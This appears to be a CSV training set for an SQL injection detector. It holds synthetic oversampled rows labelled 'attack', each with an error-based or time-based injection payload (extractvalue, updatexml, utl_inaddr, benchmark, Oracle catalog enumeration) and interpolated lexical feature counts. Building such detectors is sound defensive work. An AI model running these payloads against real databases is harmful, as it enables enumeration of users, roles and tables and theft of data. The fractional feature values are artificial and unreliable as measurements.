id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000076,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000002,0.0,221.0,42.0,4.3919306235717706,123.0,2.0,71.0,25.0,0.5565610859728507,0.009049773755656104,0.3212669683257919,0.11312217194570136,3.0,0.0,0.0,-1.3877787807814457e-17,0.0,3.0,0.0,10.0,0.0,7.0,1.0,3.0,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000077,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000012,0.0,254.0,44.0,4.466677692316377,148.0,2.0,77.0,27.0,0.5826771653543307,0.00787401574803151,0.3031496062992126,0.1062992125984252,3.0,0.0,0.0,-1.3877787807814457e-17,0.0,4.0,0.0,10.0,0.0,7.0,1.0,4.0,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.9999999999999998,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_000078,attack,error,-5967 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  # lhoh,nearest_attack_euclidean,R000071,0.2612199114525956,340.57728455315635,34.16908617873746,3.3617735155825326,78.50725853621238,48.33817235747492,155.81639674883778,57.91545691063127,0.23053647330769295,0.1419460193700901,0.45746716255156517,0.17005034477065173,0.0,0.0,1.0,-1.3877787807814457e-17,0.0,2.0,0.0,31.830913821262538,0.0,0.0,0.08454308936873023,23.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.08454308936872978,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9154569106312702,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000079,attack,error,"1"" and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""qzzg"" like ""qzzg",nearest_attack_euclidean,R000167,0.9139639131854864,201.99286350068948,32.21801186950526,3.6488505295385067,57.43602373901052,32.0,85.60186943544211,26.954970326236843,0.28573147272808364,0.15890012396799885,0.42217689290652555,0.1331915103973919,0.0,4.0,0.0,-1.3877787807814457e-17,1.0,1.390994065247369,0.0,15.563976260989476,0.0,0.0,4.0,2.3909940652473693,0.0,1.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000080,attack,error,"1""  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  ""stcv""  =  ""stcv",nearest_attack_euclidean,R000223,1.2761735460614803,179.10493027301607,29.6268245206349,3.712979637539576,55.895069726983934,29.59763219047646,69.86587739682548,23.746350958730197,0.3132209335127872,0.16421097716685085,0.3900274434985981,0.13254064582176386,0.0,4.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,14.0,0.0,0.0,4.746350958730194,1.0,0.0,1.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.3731754793650972,0.0,0.0,-1.1102230246251565e-16,1.3731754793650972,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6268245206349026,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.373175479365097
SMOTE_000081,attack,error,"1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",nearest_attack_euclidean,R000231,0.2616588696326947,138.73375958142054,25.0,3.638895050695141,32.79035440530841,38.89517720265421,49.83858237876632,17.20964559469158,0.2364745048348668,0.2804556636827026,0.35905897795003233,0.12401085353239825,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,10.20964559469158,0.0,0.0,6.0,1.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,-1.1102230246251565e-16,0.0,0.8951772026542097,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8951772026542093
SMOTE_000082,attack,error,1'+  (  select onzd where 8452  =  8452 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   +',nearest_attack_euclidean,R000281,0.09633543026600963,378.66829761501657,33.03015476227122,3.3934297848724246,89.8793809509151,53.0,172.8492261886439,62.93969047545755,0.2373532938155711,0.1399677370827415,0.4564661095997632,0.16621285950192421,1.9698452377287778,0.0,0.060309524542444315,-1.3877787807814457e-17,0.0,3.0,0.0,33.96984523772878,0.0,0.0,0.0,25.0,1.0,0.0,0.03015476227122213,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.969845237728778,0.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.969845237728778
SMOTE_000083,attack,error,"1'||  (  select 'xasp' from dual where 4025  =  4025 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000196,0.49348688099126276,225.29681894001496,34.62968189400149,3.81416453697433,64.03745515201196,40.0,89.25936378800299,32.0,0.28399613887718567,0.17762611398375708,0.3962768559520516,0.14210089118700567,4.0,0.0,0.0,-1.3877787807814457e-17,1.0,2.0,0.0,16.0,0.0,0.0,4.0,7.0,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,0.0,1.0,1.6296818940014948,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.629681894001495
SMOTE_000084,attack,error,"-8838""   )    )    as xisn where 2749  =  2749 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",nearest_attack_euclidean,R000247,0.48687716288231586,376.42314098568227,32.80289262321028,3.390615819004792,85.0,56.0,172.8173557392617,62.60578524642057,0.22582606189201349,0.14877952312885595,0.459082896739112,0.16631151824001852,0.0,0.8028926232102813,3.0,-1.3877787807814457e-17,0.0,3.0,0.0,33.80289262321028,0.0,0.0,0.0,26.0,0.0,0.8028926232102813,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,-1.1102230246251565e-16,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000085,attack,error,"1""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""vdyr""  =  ""vdyr",nearest_attack_euclidean,R000165,0.2361296361528598,332.58801611940174,39.0,3.93154630026632,110.0,55.0,129.1313073924485,38.456708726953245,0.33159917712631143,0.16579958856315571,0.38713070860542653,0.11547052570510635,0.0,4.0,0.0,-1.3877787807814457e-17,2.0,2.0,0.0,23.45670872695325,0.0,0.0,6.0,5.0,0.0,1.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000086,attack,error,"1   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000047,0.6646666262588407,156.26929148936043,32.26929148936043,3.7014476537950376,50.0,23.0,64.0,19.269291489360427,0.3199630665332345,0.14718301060528785,0.40955272516254015,0.12330119769893753,0.0,0.26929148936042474,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,14.0,0.0,0.0,4.0,0.0,0.0,0.2692914893604247,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,-2.220446049250313e-16,0.0,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000087,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,0.0,218.0,42.0,4.340822765840235,120.0,2.0,71.0,25.0,0.5504587155963303,0.009174311926605505,0.3256880733944954,0.11467889908256881,3.0,0.0,0.0,-1.3877787807814457e-17,0.0,3.0,0.0,10.0,0.0,6.0,1.0,3.0,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000088,attack,error,"1'  )   as najc where 5213  =  5213 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R000062,0.8801982994731556,175.36491612584703,33.19220358352156,3.8439551494520794,57.57661075056469,32.0,65.19220358352156,20.59610179176078,0.32810773436740903,0.18259358146476815,0.37184751814474054,0.11745116602308223,0.596101791760782,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,0.0,13.0,0.0,0.0,4.0,3.0,0.596101791760782,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-2.220446049250313e-16,0.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000089,attack,error,"1'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  'qdhz'  =  'qdhz",nearest_attack_euclidean,R000278,0.26190078469411215,177.85099021126305,31.59271568410528,3.743496224377772,60.0,24.0,70.44370589536832,23.40728431589472,0.337685278528321,0.1350741114113284,0.3956396431541518,0.13160096690619882,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,14.40728431589472,0.0,0.0,4.0,1.0,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-2.220446049250313e-16,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000090,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000012,0.0,254.0,44.0,4.466677692316377,148.0,2.0,77.0,27.0,0.5826771653543307,0.00787401574803151,0.3031496062992126,0.1062992125984252,3.0,0.0,0.0,-1.3877787807814457e-17,0.0,4.0,0.0,10.0,0.0,7.0,1.0,4.0,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.9999999999999998,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_000091,attack,error,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kird'  =  'kird",nearest_attack_euclidean,R000082,1.007828414548355,171.8064002126294,30.2007111347366,3.891750571608253,46.6009481796488,42.2018963592976,59.40260749403419,23.600948179648796,0.2719527106962843,0.2453434553176413,0.3453967158333847,0.13730711815268964,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,10.8004740898244,0.0,0.0,6.0,2.8004740898244,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.4002370449121995,0.0,0.40023704491219964,-1.1102230246251565e-16,1.5997629550878003,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.400237044912199
SMOTE_000092,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,0.0,218.0,42.0,4.340822765840235,120.0,2.0,71.0,25.0,0.5504587155963303,0.009174311926605505,0.3256880733944954,0.11467889908256881,3.0,0.0,0.0,-1.3877787807814457e-17,0.0,3.0,0.0,10.0,0.0,6.0,1.0,3.0,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000093,attack,error,"1'||  (  select 'lpej' from dual where 8294  =  8294 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",nearest_attack_euclidean,R000139,1.3022769423691287,306.31450866543196,39.57862716635799,4.076351833838077,115.20967244362132,43.0,109.05241811090534,39.05241811090533,0.3760041802481137,0.140432437258402,0.3560871634338135,0.12747621905967077,4.0,0.0,0.0,-1.3877787807814457e-17,2.0,2.0,0.0,20.0,0.0,2.0,5.0,7.052418110905329,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.5262090554526642,4.0,0.0,1.0,2.526209055452664,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,11.526209055452664
SMOTE_000094,attack,error,"-5520""   )    )    as utqk where 7762  =  7762 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R000238,0.5511632978131886,386.05267051452563,36.261169593517415,3.5699415983293807,94.44787523025207,60.49255360432173,166.64947365834325,64.46276802160862,0.24458624050687977,0.15708544011592634,0.43142032242216977,0.16690799695502412,0.0,1.0,3.0,-1.3877787807814457e-17,0.0,3.0,0.0,33.72393761512603,0.0,0.0,0.7537231978391383,27.47766081296517,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.2462768021608617,0.0,1.0,1.2462768021608617,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.492553604321723
SMOTE_000095,attack,error,select   (  case when   (  1724  =  6528  )   then 1724 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000116,0.006676442687819923,133.0,30.0,3.766869643839782,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000096,attack,error,"1""   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000123,0.03219730644266433,161.62003665123603,33.0,3.6718533577807584,50.0,23.0,67.69602932098883,20.924007330247207,0.3093889347895808,0.14231891000320715,0.4188328323392364,0.12945932286797557,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,14.924007330247207,0.0,0.0,4.0,0.0,0.0,1.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,-2.220446049250313e-16,0.0,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000097,attack,error,select   (  case when   (  5740  =  7636  )   then 5740 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000053,0.0034129014979588776,133.0,29.0,3.7527235626313797,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000098,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000005,0.0,213.0,40.0,4.192633796617524,117.0,2.0,71.0,23.0,0.5492957746478874,0.009389671361502344,0.3333333333333333,0.107981220657277,3.0,0.0,0.0,-1.3877787807814457e-17,0.0,3.0,0.0,10.0,0.0,4.0,1.0,3.0,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000099,attack,error,select   (  case when   (  4415  =  2051  )   then 4415 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000195,0.12130861548375217,133.0,27.556103632935844,3.6969889175395614,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000100,attack,error,"-8410"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""xhzr""  =  ""xhzr",nearest_attack_euclidean,R000068,0.9666536154375397,378.2323907283229,36.0,3.5865985173470594,100.12430981854712,52.76035915154559,160.54592600050228,64.80179575772796,0.26408719431447847,0.14032850696037072,0.42405644113302343,0.1715278575921274,0.0,4.0,1.0,-1.3877787807814457e-17,0.0,2.619820424227204,0.0,33.04143660618237,0.0,0.0,0.6198204242272038,25.90089787886398,0.0,1.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.3801795757727964,0.0,0.0,1.3801795757727962,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.760359151545592
SMOTE_000101,attack,error,"1'||  (  select 'kfyh' where 4737  =  4737 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x   )    )   ||'",nearest_attack_euclidean,R000163,1.306049925340728,339.0597204359244,40.0,4.030727745599796,113.0,63.0,124.0,39.05972043592445,0.3332862117070628,0.18581443661544209,0.36573000222721935,0.11516934945027572,3.029860217962226,0.0,0.0,-1.3877787807814457e-17,2.0,2.0,0.0,22.0,0.0,0.0,6.0,8.029860217962225,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.5149301089811128,7.0,3.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,15.0
